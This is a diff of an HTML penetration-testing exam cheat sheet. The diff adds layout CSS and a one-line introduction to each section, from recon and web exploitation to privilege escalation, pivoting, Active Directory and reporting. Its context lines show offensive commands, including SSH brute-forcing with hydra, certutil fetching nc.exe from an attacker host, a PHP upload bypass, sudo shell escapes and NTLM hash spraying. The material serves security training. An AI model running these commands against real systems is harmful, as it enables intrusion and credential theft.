@@ -175,7 +175,7 @@
   @media (prefers-reduced-motion:reduce){*{transition:none!important;}}
 
   /* ===================== DOCS LAYOUT (sidebar + content) ===================== */
-  :root{ --sb-w:288px; --content-max:980px; --topbar-h:52px; }
+  :root{ --sb-w:288px; --content-max:1600px; --topbar-h:52px; }
   html{scroll-behavior:smooth;}
   body{overflow-x:hidden;}
 
@@ -217,8 +217,14 @@
 
   /* --- content --- */
   .content{margin-left:var(--sb-w);min-width:0;}
-  .doc{max-width:var(--content-max);margin:0 auto;padding:26px 30px 90px;}
+  .doc{max-width:var(--content-max);margin:0 auto;padding:26px 40px 90px;}
   .page-title{font-size:23px;font-weight:700;letter-spacing:-.02em;margin:0 0 10px;}
+  .sublead{color:var(--dim);font-size:13.5px;line-height:1.55;margin:-2px 0 15px;max-width:92ch;}
+  .sublead b{color:var(--text);font-weight:600;}
+  /* hero spans full width; dense grids fill the horizontal space */
+  .doc .hero .lead{max-width:92ch;}
+  .doc .grid{grid-template-columns:repeat(auto-fill,minmax(300px,1fr));}
+  .doc .grid.wide{grid-template-columns:repeat(auto-fill,minmax(400px,1fr));}
 
   .topbar{display:none;}
   .burger{display:inline-flex;flex-direction:column;justify-content:center;gap:4px;width:36px;height:34px;
@@ -318,7 +324,7 @@
   <!-- STRATEGY -->
   <section class="section" id="strat" style="--pc:var(--accent)">
     <div class="shead"><span class="bar"></span><span class="num">00</span><h2>Exam Strategy &amp; Workflow</h2><span class="chev">▼</span></div>
-    <div class="sbody"><div class="grid wide">
+    <div class="sbody"><p class="sublead">The mindset that passes a practical exam: a repeatable loop, and a triage order that keeps you <b>moving</b> instead of rabbit-holing on one port.</p><div class="grid wide">
       <div class="card"><h3>The loop <span class="tag">mindset</span></h3>
         <ul class="tips">
           <li><b>Enumerate → foothold → stabilize → loot → privesc → repeat.</b> Re-enumerate after every new access level.</li>
@@ -345,7 +351,7 @@
   <!-- RECON -->
   <section class="section" id="recon" style="--pc:var(--recon)">
     <div class="shead"><span class="bar"></span><span class="num">01</span><h2>Recon &amp; Enumeration</h2><span class="chev">▼</span></div>
-    <div class="sbody"><div class="grid">
+    <div class="sbody"><p class="sublead">Before you attack anything, map the whole surface — every open port, service version, share, and hidden path. Most footholds live here, <b>not on the homepage</b>.</p><div class="grid">
 
       <div class="card"><h3>Nmap <span class="tag">scan</span></h3>
         <span class="lbl">quick + scripts + versions</span>
@@ -408,7 +414,7 @@ searchsploit -m 50383             <span class="cm"># copy exploit locally</span>
   <!-- WEB -->
   <section class="section" id="web" style="--pc:var(--web)">
     <div class="shead"><span class="bar"></span><span class="num">02</span><h2>Web Exploitation</h2><span class="chev">▼</span></div>
-    <div class="sbody"><div class="grid">
+    <div class="sbody"><p class="sublead">The web app is the most common way in. Work injection, file inclusion, upload, and logic flaws in order — and always tie a bug to <b>real impact</b>.</p><div class="grid">
 
       <div class="card"><h3>SQL Injection <span class="tag">sqli</span></h3>
         <span class="lbl">auth bypass (username field)</span>
@@ -478,7 +484,7 @@ GIF89a; &lt;?php ... ?&gt;               <span class="cm"># magic bytes</span></
   <!-- BURP -->
   <section class="section" id="burp" style="--pc:var(--web)">
     <div class="shead"><span class="bar"></span><span class="num">03</span><h2>Burp Suite</h2><span class="chev">▼</span></div>
-    <div class="sbody"><div class="grid wide">
+    <div class="sbody"><p class="sublead">The proxy workflow behind manual web testing — intercept a request, replay it in Repeater, and tamper parameters, headers, and tokens.</p><div class="grid wide">
       <div class="card"><h3>Core tools <span class="tag">workflow</span></h3>
         <ul class="tips">
           <li><b>Proxy</b> — intercept browser↔server (127.0.0.1:8080 + FoxyProxy)</li>
@@ -503,7 +509,7 @@ GIF89a; &lt;?php ... ?&gt;               <span class="cm"># magic bytes</span></
   <!-- PASSWORDS -->
   <section class="section" id="pass" style="--pc:var(--pass)">
     <div class="shead"><span class="bar"></span><span class="num">04</span><h2>Password Attacks</h2><span class="chev">▼</span></div>
-    <div class="sbody"><div class="grid">
+    <div class="sbody"><p class="sublead">Turn a username or a captured hash into a working credential — spraying and brute-forcing online, or cracking offline.</p><div class="grid">
 
       <div class="card"><h3>Hydra <span class="tag">online</span></h3>
         <div class="cmd"><code>hydra -l USER -P /usr/share/wordlists/rockyou.txt ssh://TARGET
@@ -543,7 +549,7 @@ hashid '$1$...'
   <!-- SHELLS -->
   <section class="section" id="shells" style="--pc:var(--access)">
     <div class="shead"><span class="bar"></span><span class="num">05</span><h2>Shells &amp; Listeners</h2><span class="chev">▼</span></div>
-    <div class="sbody"><div class="grid">
+    <div class="sbody"><p class="sublead">Get a shell, pair the <b>right listener with each payload</b>, then upgrade it to a stable, interactive — or encrypted — session.</p><div class="grid">
 
       <div class="card"><h3>Reverse vs Bind <span class="tag">which?</span></h3>
         <p class="note"><b>Reverse</b> — target connects back to <i>your</i> listener. Default choice: beats inbound firewalls / NAT on the target.</p>
@@ -647,7 +653,7 @@ certutil -urlcache -f http://LHOST/nc.exe nc.exe   <span class="cm"># windows</s
   <!-- METASPLOIT -->
   <section class="section" id="msf" style="--pc:var(--access)">
     <div class="shead"><span class="bar"></span><span class="num">06</span><h2>Metasploit &amp; msfvenom</h2><span class="chev">▼</span></div>
-    <div class="sbody"><div class="grid">
+    <div class="sbody"><p class="sublead">When a hand-built shell isn't enough: framework-driven exploitation, payload generation with msfvenom, and Meterpreter post-exploitation.</p><div class="grid">
       <div class="card"><h3>msfconsole <span class="tag">exploit</span></h3>
         <div class="cmd"><code>msfconsole -q
 search TYPE:exploit apache
@@ -672,7 +678,7 @@ run</code><button class="copy">⧉</button></div>
   <!-- LINUX PRIVESC -->
   <section class="section" id="lpe" style="--pc:var(--privesc)">
     <div class="shead"><span class="bar"></span><span class="num">07</span><h2>Privilege Escalation — Linux</h2><span class="chev">▼</span></div>
-    <div class="sbody"><div class="grid">
+    <div class="sbody"><p class="sublead">From a foothold to root — enumerate the box, spot the one misconfiguration or SUID binary that matters, and exploit it (<b>GTFOBins</b>).</p><div class="grid">
 
       <div class="card"><h3>Enumerate <span class="tag">scan</span></h3>
         <div class="cmd"><code>./linpeas.sh
@@ -776,7 +782,7 @@ sudo ed                        <span class="cm"># then !/bin/sh</span></code><bu
   <!-- WINDOWS PRIVESC -->
   <section class="section" id="wpe" style="--pc:var(--privesc)">
     <div class="shead"><span class="bar"></span><span class="num">08</span><h2>Privilege Escalation — Windows</h2><span class="chev">▼</span></div>
-    <div class="sbody"><div class="grid">
+    <div class="sbody"><p class="sublead">From a user shell to SYSTEM — abuse privileges, weak service permissions, and signed living-off-the-land binaries (<b>LOLBAS</b>).</p><div class="grid">
 
       <div class="card"><h3>Enumerate <span class="tag">scan</span></h3>
         <div class="cmd"><code>.\winPEASx64.exe
@@ -885,7 +891,7 @@ pcalua.exe -a C:\f.exe</code><button class="copy">⧉</button></div>
   <!-- PIVOTING -->
   <section class="section" id="pivot" style="--pc:var(--recon)">
     <div class="shead"><span class="bar"></span><span class="num">09</span><h2>Pivoting &amp; Tunneling</h2><span class="chev">▼</span></div>
-    <div class="sbody"><div class="grid">
+    <div class="sbody"><p class="sublead">Reach networks you can't touch directly by tunnelling through the host you already own — port-forwards, SOCKS proxies, and full tun routes.</p><div class="grid">
 
       <div class="card"><h3>SSH port forwarding <span class="tag">ssh</span></h3>
         <span class="lbl">local (-L) → reach a service behind the pivot</span>
@@ -954,7 +960,7 @@ portfwd add -l 3389 -p 3389 -r 10.10.20.5</code><button class="copy">⧉</button
   <!-- AD -->
   <section class="section" id="ad" style="--pc:var(--ad)">
     <div class="shead"><span class="bar"></span><span class="num">10</span><h2>Active Directory</h2><span class="chev">▼</span></div>
-    <div class="sbody"><div class="grid">
+    <div class="sbody"><p class="sublead">Breach, enumerate, and move through a Windows domain — from first credential to Domain Admin via Kerberos and credential reuse.</p><div class="grid">
 
       <div class="card"><h3>Breach — first creds <span class="tag">initial</span></h3>
         <div class="cmd"><code>kerbrute userenum -d DOMAIN --dc DC-IP users.txt
@@ -992,7 +998,7 @@ nxc smb HOST -u USER -H NTLM                     <span class="cm"># spray hash</
   <!-- REFERENCE TABLES -->
   <section class="section" id="ref" style="--pc:var(--report)">
     <div class="shead"><span class="bar"></span><span class="num">11</span><h2>Reference Tables</h2><span class="chev">▼</span></div>
-    <div class="sbody"><div class="grid wide">
+    <div class="sbody"><p class="sublead">Fast lookups you'll reach for mid-exam: common ports, Hashcat modes, Windows event IDs, and the framework acronyms.</p><div class="grid wide">
 
       <div class="tblwrap"><table>
         <caption>Common ports</caption>
@@ -1070,7 +1076,7 @@ nxc smb HOST -u USER -H NTLM                     <span class="cm"># spray hash</
   <!-- REPORTING -->
   <section class="section" id="report" style="--pc:var(--report)">
     <div class="shead"><span class="bar"></span><span class="num">12</span><h2>Methodology &amp; Reporting</h2><span class="chev">▼</span></div>
-    <div class="sbody"><div class="grid wide">
+    <div class="sbody"><p class="sublead">Turn findings into a defensible report — impact first, severity rated in isolation, remediation aimed at the <b>root cause</b>.</p><div class="grid wide">
       <div class="card"><h3>Report structure <span class="tag">deliver</span></h3>
         <ul class="tips">
           <li><b>Summary</b> (business + security) — write it last</li>
